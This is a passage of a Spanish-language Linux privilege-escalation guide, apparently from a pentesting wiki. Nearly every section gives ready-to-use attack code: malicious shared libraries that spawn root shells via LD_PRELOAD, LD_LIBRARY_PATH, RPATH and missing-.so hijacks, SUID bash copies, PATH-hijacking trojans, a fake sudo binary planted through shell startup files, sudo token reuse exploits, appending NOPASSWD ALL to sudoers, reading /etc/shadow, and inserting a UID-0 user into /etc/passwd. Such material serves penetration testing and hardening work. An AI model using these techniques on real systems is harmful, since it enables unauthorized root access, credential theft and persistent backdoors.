Las variables de Terraform se pueden proporcionar mediante variables de entorno `TF_VAR_<name>` si la regla específica de sudo las conserva. Una **lectura** de un symlink de origen también requiere un provider que siga el enlace y copie el resultado protegido a un destino legible por quien invoca. Una **escritura** en un symlink de destino requiere, por separado, una entrada de destino controlada por quien invoca y un provider privilegiado que la siga al escribir; un job programado posterior es solo una posible consecuencia. Antes de probar cualquiera de las dos rutas, inspecciona la concesión exacta de sudo, los archivos `.tf` pertinentes, la configuración de CLI seleccionada y la propiedad de las rutas con comandos de solo lectura como `sudo -l`, `stat` y `readlink`. Las validaciones léxicas débiles como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` no resuelven los symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform resuelve el symlink y copia el archivo real `/root/root.txt` en un destino legible por el atacante. El mismo enfoque se puede usar para **escribir** en rutas privilegiadas creando symlinks de destino de antemano (p. ej., apuntando la ruta de destino del proveedor a una ubicación dentro de `/etc/cron.d/`).

### requiretty / !requiretty

En algunas distribuciones antiguas, sudo se puede configurar con `requiretty`, lo que obliga a ejecutar sudo solo desde un TTY interactivo. Si se establece `!requiretty` (o la opción no está presente), sudo se puede ejecutar desde contextos no interactivos, como reverse shells, trabajos cron o scripts.

```bash
Defaults !requiretty
```

Esto no es una vulnerabilidad directa por sí sola, pero amplía las situaciones en las que se pueden abusar las reglas de sudo sin necesitar una PTY completa.

### Sudo env_keep+=PATH / secure_path inseguro → secuestro de PATH

Si `sudo -l` muestra `env_keep+=PATH` o un `secure_path` que contiene entradas modificables por un atacante (p. ej., `/home/<user>/bin`), se puede reemplazar un comando externo sin ruta explícita dentro del objetivo permitido por sudo.<sup>[[3]](#references)</sup> La ausencia de un `secure_path` efectivo también merece revisión **si** el entorno de sudo del comando conserva un `PATH` controlado por quien lo invoca; la ausencia por sí sola no demuestra que así sea. Lee el script permitido sin ejecutarlo y, después, verifica la regla exacta de RunAs y argumentos, la ruta de búsqueda de comandos efectiva y que exista un directorio modificable y recorrible, buscado antes que los demás, que contenga el nombre del comando. La autenticación, `NOEXEC`, los builtins del shell y las rutas absolutas a comandos pueden cambiar el resultado.

- Requisitos: una regla de sudo (a menudo `NOPASSWD`) que ejecute un script/binario que invoque comandos sin rutas absolutas (`free`, `df`, `ps`, etc.) y una entrada de PATH modificable que se busque primero.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Ejecución de Sudo eludiendo rutas
**Salta** para leer otros archivos o usa **symlinks**. Por ejemplo, en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Si se utiliza un **comodín** (\*), es aún más fácil:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando de sudo/binario SUID sin ruta del comando

Si se concede el **permiso de sudo** para un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_, puedes explotarlo cambiando la variable PATH.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Esta técnica también puede utilizarse si un binario **suid** **ejecuta otro comando sin especificar la ruta (comprueba siempre con** _**strings**_ **el contenido de un binario SUID extraño)**.

[Ejemplos de payloads que ejecutar.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binario SUID con la ruta del comando

Si el binario **suid** **ejecuta otro comando especificando la ruta**, puedes intentar **exportar una función** con el nombre del comando que está ejecutando el archivo suid.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_, tienes que intentar crear la función y exportarla:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Entonces, cuando llames al binario SUID, se ejecutará esta función

### Wrappers SUID personalizados para copiar archivos

Una utilidad SUID propiedad de root que acepta rutas de origen y destino puede cruzar dos límites de confianza distintos. Si construye un comando de shell a partir de cualquiera de los argumentos (por ejemplo, pasando un comando `cp` construido a `system()`), los metacaracteres del shell pueden ejecutar otro comando con sus privilegios efectivos. Incluso si invoca `cp` de forma segura, sin usar un shell, un destino sin restricciones puede permitir la escritura arbitraria de archivos con privilegios, como `/etc/passwd`. Revisa cómo el wrapper maneja los argumentos, el comportamiento del UID efectivo, las restricciones del destino y si el archivo copiado conserva contenido controlado por quien lo invoca; un error genérico de `cp` o el bit SUID, por sí solos, no prueban ninguna de las dos posibilidades. Enumera el binario y sus permisos de forma pasiva antes de realizar pruebas manuales.

### Script modificable ejecutado por un wrapper SUID

Una configuración incorrecta común en aplicaciones personalizadas es un wrapper binario SUID propiedad de root que ejecuta un script, mientras que el script puede ser modificado por usuarios con pocos privilegios.

Patrón típico:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Si `/usr/local/bin/backup.sh` tiene permisos de escritura, puedes añadir comandos de payload y luego ejecutar el wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Comprobaciones rápidas:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Esta ruta de ataque es especialmente común en wrappers de «mantenimiento»/«backup» incluidos en `/usr/local/bin`.

### LD_PRELOAD y **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se utiliza para especificar una o varias bibliotecas compartidas (archivos .so) que el cargador debe cargar antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). Este proceso se conoce como precarga de una biblioteca.

Sin embargo, para mantener la seguridad del sistema y evitar que se abuse de esta funcionalidad, especialmente con ejecutables **suid/sgid**, el sistema aplica ciertas condiciones:

- El cargador ignora **LD_PRELOAD** en los ejecutables cuyo ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- En los ejecutables con suid/sgid, solo se precargan bibliotecas ubicadas en rutas estándar que también tengan suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la instrucción **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** se conserve y se reconozca incluso al ejecutar comandos con `sudo`, lo que puede llevar a la ejecución de código arbitrario con privilegios elevados.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Guárdalo como **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Luego **compílalo** usando:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finalmente, **escala privilegios** ejecutando

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Se puede abusar de una privesc similar si el atacante controla la variable de entorno **LD_LIBRARY_PATH**, porque controla la ruta en la que se buscarán las bibliotecas.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Binario SUID – inyección de .so

Cuando encuentres un binario con permisos **SUID** que parezca inusual, es recomendable comprobar si está cargando correctamente los archivos **.so**. Esto se puede verificar ejecutando el siguiente comando:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Por ejemplo, encontrar un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere un posible vector de explotación.

Para aprovecharlo, se crearía un archivo C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Este código, una vez compilado y ejecutado, busca elevar privilegios manipulando los permisos de archivos y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un objeto compartido (.so) con:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Finalmente, ejecutar el binario SUID afectado debería activar el exploit, lo que podría permitir comprometer el sistema.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta en la que podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Si recibes un error como

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

eso significa que la biblioteca que has generado debe tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista seleccionada de binarios de Unix que un atacante puede explotar para eludir las restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo, pero para los casos en los que **solo puedes inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de los binarios de Unix que pueden usarse para escapar de shells restringidas, escalar o mantener privilegios elevados, transferir archivos, iniciar bind y reverse shells, y facilitar otras tareas de post-explotación.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si puedes acceder a `sudo -l`, puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reutilización de tokens de Sudo

En los casos en los que tienes **acceso a sudo**, pero no la contraseña, puedes escalar privilegios **esperando a que se ejecute un comando sudo y luego secuestrando el token de sesión**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilegios:

- Ya tienes una shell como usuario "_sampleuser_"
- "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (por defecto, esa es la duración del token de sudo que nos permite usar `sudo` sin introducir una contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` devuelve 0
- `gdb` está disponible (puedes subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` y establecer `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente una shell root; ejecuta `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- El **segundo exploit** (`exploit_v2.sh`) creará un shell sh en _/tmp_ **propietario de root y con setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hará que los **tokens de sudo sean eternos y permitirá que todos los usuarios usen sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Si tienes **permisos de escritura** en la carpeta o en alguno de los archivos creados dentro de ella, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un token de sudo para un usuario y un PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios de sudo** sin necesidad de conocer la contraseña haciendo lo siguiente:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. De forma predeterminada, **solo el usuario root y el grupo root pueden leer estos archivos**.\
**Si** puedes **leer** este archivo, podrías **obtener información interesante**, y si puedes **escribir** en cualquier archivo, podrás **escalar privilegios**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Si puedes escribir, puedes abusar de este permiso.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Otra forma de aprovechar estos permisos:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Existen algunas alternativas al binario `sudo`, como `doas` para OpenBSD. Recuerda revisar su configuración en `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Si `doas` permite un editor o intérprete, comprueba escapes al estilo GTFOBins:

```bash
doas vim
:!/bin/sh
```

A una regla de `doas` que permite ejecutar `dstat` original basado en Python como root también conviene revisarle la ruta de plugins. Su [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) y [código fuente](https://github.com/dstat-real/dstat/blob/master/dstat) incluyen `/usr/share/dstat/` y `/usr/local/share/dstat/` entre las ubicaciones de los plugins `dstat_*.py`. Si el usuario actual puede escribir en una ubicación que la versión instalada realmente utilice y buscar en ella, un plugin seleccionado podría ejecutarse con la identidad RunAs de `doas`. Confirma la regla efectiva, la búsqueda de plugins de esa versión, los permisos o ACL del directorio y de sus directorios superiores, y si quien invoca puede seleccionar un plugin; una regla de `dstat` o un directorio con permisos de escritura por sí solos solo son indicios. Otras implementaciones de `dstat` pueden usar sistemas de plugins distintos. Inspecciona los metadatos de forma pasiva, sin cargar ningún plugin.

### Sudo Hijacking

Si sabes que un **usuario suele conectarse a una máquina y usar `sudo`** para escalar privilegios, y obtuviste una shell en el contexto de ese usuario, puedes **crear un nuevo ejecutable de sudo** que ejecute tu código como root y luego el comando del usuario. Después, **modifica el $PATH** del contexto del usuario (por ejemplo, añadiendo la nueva ruta a .bash_profile) para que, cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.

Ten en cuenta que, si el usuario utiliza un shell distinto (no bash), tendrás que modificar otros archivos para añadir la nueva ruta. Por ejemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc` y `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutando algo como:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteca compartida

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde provienen los archivos de configuración cargados**. Normalmente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Esto significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** donde se **buscarán** las **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.

Si por algún motivo **un usuario tiene permisos de escritura** en alguna de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta especificada en un archivo de configuración dentro de `/etc/ld.so.conf.d/*.conf`, podría escalar privilegios.\
Echa un vistazo a **cómo explotar esta configuración incorrecta** en la siguiente página:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Al copiar la biblioteca en `/var/tmp/flag15/`, el programa la usará desde esa ubicación, tal como se especifica en la variable `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Luego crea una biblioteca maliciosa en /var/tmp con gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capacidades

Las Linux capabilities proporcionan **un subconjunto de los privilegios root disponibles a un proceso**. Esto divide de manera efectiva los **privilegios root en unidades más pequeñas y diferenciadas**. Cada una de estas unidades se puede conceder de forma independiente a los procesos. De este modo, se reduce el conjunto completo de privilegios, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **obtener más información sobre las capabilities y cómo abusar de ellas**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permisos de directorios

En un directorio, el **bit de "ejecución"** implica que el usuario afectado puede hacer "**cd**" a la carpeta.\
El bit de **"lectura"** implica que el usuario puede **listar** los **archivos**, y el bit de **"escritura"** implica que puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Access Control Lists (ACLs) representan la capa secundaria de permisos discrecionales, capaces de **anular los permisos ugo/rwx tradicionales**. Estos permisos mejoran el control sobre el acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Puedes encontrar más detalles [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Concede** al usuario "kali" permisos de lectura y escritura sobre un archivo:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Obtén** archivos con ACL específicas del sistema:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor de ACL oculta en archivos complementarios de sudoers

Un error de configuración común es que un archivo de `/etc/sudoers.d/` propiedad de root y con permisos `440` siga concediendo acceso de escritura a un usuario con pocos privilegios mediante ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Si ves algo como `user:alice:rw-`, el usuario puede añadir una regla de sudo a pesar de los bits de modo restrictivos:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Este es un vector de persistencia mediante ACL y escalada de privilegios de alto impacto, ya que es fácil pasarlo por alto en revisiones que solo usan `ls -l`.

## Sesiones de shell abiertas

El acceso entre usuarios a GNU Screen depende de la **configuración y la ACL de la sesión en ejecución**, no solo de su versión. [GNU Screen documenta](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) que debe compilarse con soporte multiusuario; `multiuser on` y una concesión mediante `acladd` o un `aclchg` adecuado permiten que otro usuario se conecte. [El manual también exige setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) para buscar sesiones entre usuarios. Que un socket propiedad de root sea visible o que exista un binario `screen` SUID no demuestra por sí solo que se pueda conectar a una shell de root. Confirma que la sesión activa sea multiusuario, que el usuario actual tenga permisos efectivos para introducir comandos y que la shell de esa sesión se ejecute como el usuario privilegiado antes de considerarlo una vía de escalada.

### Secuestro de sesiones de screen

**Listar sesiones de screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Secuestro de sesiones de screen - Ubicaciones de sockets (algunos sistemas exponen una como enlace simbólico de la otra): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Conectarse a una sesión**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Secuestro de sesiones de tmux

Este era un problema de las **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como usuario sin privilegios.

**Listar sesiones de tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Ubicaciones de sockets (algunos sistemas exponen uno como enlace simbólico del otro) - secuestro de sesiones tmux: tmux -S /tmp/dev sess ls Lista usando ese socket; puedes iniciar una sesión tmux en ese socket...](<../../images/image (837).png>)

**Conectarse a una sesión**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Consulta **Valentine box from HTB** para ver un ejemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Las claves generadas con versiones afectadas de OpenSSL de Debian o sus derivados durante el período histórico vulnerable pueden tener aleatoriedad predecible; la distribución actual del host o la versión parcheada de OpenSSL no permiten saber cómo se generó una clave anterior. Comprueba la **clave específica** con una lista negra histórica adecuada y verifica su procedencia. El [manual de `ssh-vulnkey` de Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) describe cómo comprobar claves públicas y archivos `authorized_keys`, y [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) registra la corrección de OpenSSL. Una entrada en el archivo `authorized_keys` de una cuenta privilegiada es solo un indicio de escalada si se puede recuperar la clave privada correspondiente y la política SSH efectiva sigue aceptando esa clave para esa cuenta; una clave de **host** débil no es por sí misma una credencial de inicio de sesión. Sustituye las claves comprometidas y elimina sus autorizaciones antiguas.

### Valores de configuración de SSH relevantes

- **PasswordAuthentication:** Especifica si se permite la autenticación mediante contraseña. El valor predeterminado de OpenSSH upstream es `yes`; la configuración de la distribución puede sobrescribirlo.
- **PubkeyAuthentication:** Especifica si se permite la autenticación mediante clave pública. El valor predeterminado es `yes`.
- **PermitEmptyPasswords**: Si se permite la autenticación mediante contraseña, especifica si el servidor permite iniciar sesión en cuentas con contraseñas vacías. El valor predeterminado es `no`.

### Archivos de control de inicio de sesión

Estos archivos determinan quién puede iniciar sesión y de qué manera:

- **`/etc/nologin`**: si existe, impide los inicios de sesión de usuarios que no sean root y muestra su mensaje.
- **`/etc/securetty`**: restringe desde dónde puede iniciar sesión root (lista de TTY permitidos).
- **`/etc/motd`**: banner posterior al inicio de sesión (puede filtrar información del entorno o de mantenimiento).

### PermitRootLogin

Especifica si root puede iniciar sesión mediante ssh. El valor predeterminado de OpenSSH upstream es `prohibit-password`; la configuración de la distribución puede sobrescribirlo. Valores posibles:

- `yes`: root puede iniciar sesión usando contraseña y clave privada
- `without-password` o `prohibit-password`: root solo puede iniciar sesión con una clave privada
- `forced-commands-only`: root solo puede iniciar sesión con una clave privada y si se especifican las opciones de comandos
- `no` : no

### Autoridades de certificación de usuario SSH de confianza

`TrustedUserCAKeys` indica las claves públicas en las que confía sshd para firmar certificados de **usuario**. Si un usuario con menos privilegios puede leer la clave privada de la CA correspondiente, revisa quién puede obtener un certificado y con qué principales de cuenta podría autenticarse. `AuthorizedPrincipalsFile` o `AuthorizedPrincipalsCommand` pueden restringir los nombres aceptados; si no se configura ninguno de ellos, el certificado debe incluir el nombre de la cuenta de destino. `PermitRootLogin prohibit-password` bloquea la autenticación de root mediante contraseña, pero aún puede permitir la autenticación con certificados. La mera exposición de una ruta a una clave no demuestra que haya acceso: confirma el par de claves pública/privada, las reglas `Match` efectivas, la política de la cuenta, la frase de contraseña de la clave, la revocación y los algoritmos de firma aceptados. No incluyas bytes de claves privadas en la salida de enumeración. Consulta el [manual de configuración del servidor OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Una clave privada de CA también puede ser utilizable **sin que el usuario actual pueda leerla** si una regla de delegación de privilegios permite a ese usuario invocar un [firmante de certificados como `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) sin restricciones bajo la identidad del propietario de la clave. Correlaciona el comando y los argumentos permitidos exactos con el acceso del firmante a la clave, la CA pública en la que confía la configuración efectiva de sshd, el principal aceptado para la cuenta de destino, la validez del certificado y la política de inicio de sesión de esa cuenta. Un comando de firmante delegado o un archivo de CA de confianza, por sí solos, no demuestran que haya acceso a otra cuenta; no firmes un certificado de prueba durante la enumeración pasiva.

### AuthorizedKeysFile

Especifica los archivos que contienen las claves públicas que pueden usarse para la autenticación de usuarios. Puede incluir tokens como `%h`, que se sustituirá por el directorio personal. **Puedes indicar rutas absolutas** (que comiencen con `/`) o **rutas relativas al directorio personal del usuario**. Por ejemplo:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Esa configuración indicará que, si intentas hacer login con la clave **privada** del usuario «**testusername**», ssh comparará la clave pública de tu clave con las que se encuentran en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

El reenvío del agente SSH te permite **usar tus claves SSH locales en lugar de dejar las claves** (¡sin passphrases!) en tu servidor. Así, podrás **saltar** mediante ssh **a un host** y desde allí **saltar a otro** host **usando** la **clave** ubicada en tu **host inicial**.

Debes configurar esta opción en `$HOME/.ssh.config` así:

```
Host example.com
  ForwardAgent yes
```

Observa que si `Host` es `*`, cada vez que el usuario se conecte a otra máquina, ese host podrá acceder a las claves (lo cual supone un problema de seguridad).

El archivo `/etc/ssh_config` puede **sobrescribir** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío de ssh-agent mediante la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitirlo).

Si descubres que Forward Agent está configurado en un entorno, lee la siguiente página, ya que **quizá puedas abusar de ello para escalar privilegios**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos interesantes

### Archivos de perfiles

El archivo `/etc/profile` y los archivos dentro de `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia un shell nuevo**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos, puedes escalar privilegios**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Si encuentras algún script de perfil extraño, deberías revisarlo en busca de **datos confidenciales**.

### Archivos Passwd/Shadow

Según el sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` podrían tener otro nombre o podría haber una copia de seguridad. Por lo tanto, se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si contienen hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

En algunas ocasiones puedes encontrar **hashes de contraseñas** dentro del archivo `/etc/passwd` (o equivalente)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd con permisos de escritura

Primero, genera una contraseña con uno de los siguientes comandos.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Luego agrega el usuario hacker y la contraseña generada.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Por ejemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

